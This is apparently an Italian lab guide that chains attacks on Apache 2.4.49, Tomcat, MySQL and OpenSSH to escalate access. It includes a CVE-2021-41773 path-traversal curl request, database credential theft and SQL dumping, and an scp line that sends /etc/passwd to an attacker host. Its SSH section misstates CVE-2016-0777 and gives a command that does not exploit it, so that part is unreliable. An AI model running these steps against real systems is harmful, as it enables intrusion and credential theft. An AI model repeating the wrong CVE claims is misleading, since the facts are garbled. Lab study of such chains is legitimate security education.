# **Concatenazione delle Vulnerabilità: Apache, Tomcat, MySQL e SSH**

## **Introduzione**
Questo documento descrive il processo di concatenazione delle vulnerabilità tra **Apache 2.4.49**, **Tomcat 8.5.32**, **MySQL 5.7.29** e **SSH 7.2p2** per simulare un attacco avanzato in un ambiente controllato. Lo scopo è creare un'escalation di privilegi attraverso una serie di exploit concatenati.

La strategia segue questa sequenza:

1. **Apache → Tomcat** (Path Traversal e Remote Code Execution - CVE-2021-41773)
2. **Tomcat → MySQL** (Credenziali in chiaro in `context.xml` e JDBC exploit)
3. **MySQL → SSH** (Esfiltrazione di credenziali e accesso persistente)

## **1. Apache 2.4.49 → Tomcat 8.5.32**
Apache è stato configurato per inoltrare richieste a Tomcat tramite il connettore **mod_jk**, rendendo possibile un attacco di **Path Traversal** per accedere a file sensibili.

### **1.1 Configurazione mod_jk**
Apache è stato configurato con il modulo **mod_jk**, e il file di configurazione **workers.properties** è stato impostato per inoltrare richieste a Tomcat:

```bash
sudo nano /usr/local/apache2/conf/workers.properties
```

Contenuto:
```
worker.list=tomcatWorker
worker.tomcatWorker.type=ajp13
worker.tomcatWorker.host=127.0.0.1
worker.tomcatWorker.port=8009
```

### **1.2 Path Traversal Exploit**
Apache 2.4.49 è vulnerabile a **CVE-2021-41773**, permettendo di accedere a file arbitrari:

Esempio di exploit:
```bash
curl -v "http://[IP_PUBBLICO]/icons/../../../../opt/tomcat/tomcat/conf/context.xml"
```

Se l'attacco ha successo, viene mostrato il contenuto di `context.xml`, che contiene credenziali in chiaro per il database MySQL.

## **2. Tomcat 8.5.32 → MySQL 5.7.29**
Una volta ottenute le credenziali dal **context.xml**, l'attaccante può connettersi a MySQL.

### **2.1 Lettura delle credenziali da context.xml**
Nel file `context.xml` abbiamo:
```xml
<Resource name="jdbc/tomcatdb"
          auth="Container"
          type="javax.sql.DataSource"
          username="tomcat"
          password="tomcat123"
          driverClassName="com.mysql.cj.jdbc.Driver"
          url="jdbc:mysql://127.0.0.1:3306/tomcat_db?autoReconnect=true&useSSL=false"
          maxActive="20"
          maxIdle="10"
          maxWait="-1"/>
```

L'attaccante ora ha accesso a `tomcat_db` con credenziali **tomcat/tomcat123**.

### **2.2 Accesso al database MySQL**
```bash
mysql -u tomcat -p -h 127.0.0.1
```
Inserendo la password **tomcat123**, l'attaccante ottiene accesso al database.

Ora può cercare credenziali SSH salvate nel database con:
```sql
SELECT * FROM users;
```

Se le credenziali sono salvate in chiaro, può usarle per accedere a SSH.

## **3. MySQL 5.7.29 → SSH 7.2p2**
Se MySQL contiene credenziali per SSH, l'attaccante può utilizzarle per ottenere accesso al server.

### **3.1 Verifica dell’accesso SSH**
Se trova credenziali valide, può tentare l'accesso con:
```bash
ssh user@[IP_PUBBLICO]
```
Se ha successo, l’attaccante ha ottenuto un accesso persistente al sistema.

### **3.2 Privilege Escalation su SSH**
OpenSSH 7.2p2 è vulnerabile a **CVE-2016-0777**, che consente l'esfiltrazione di chiavi private.

Esempio di exploit:
```bash
scp -S '/dev/fd/3' /etc/passwd attacker@remote:/tmp/passwd_copy
```

Se l'attacco ha successo, l’attaccante ottiene le credenziali dell’utente root.

## **Conclusione**
Abbiamo costruito una catena di vulnerabilità che consente un'escalation progressiva:
1. **Apache → Tomcat** (Path Traversal per rubare credenziali MySQL)
2. **Tomcat → MySQL** (Accesso al database per estrarre credenziali SSH)
3. **MySQL → SSH** (Utilizzo delle credenziali per ottenere accesso persistente al server)

Questa configurazione consente di simulare attacchi reali e studiare tecniche di exploitation in un ambiente sicuro e controllato.

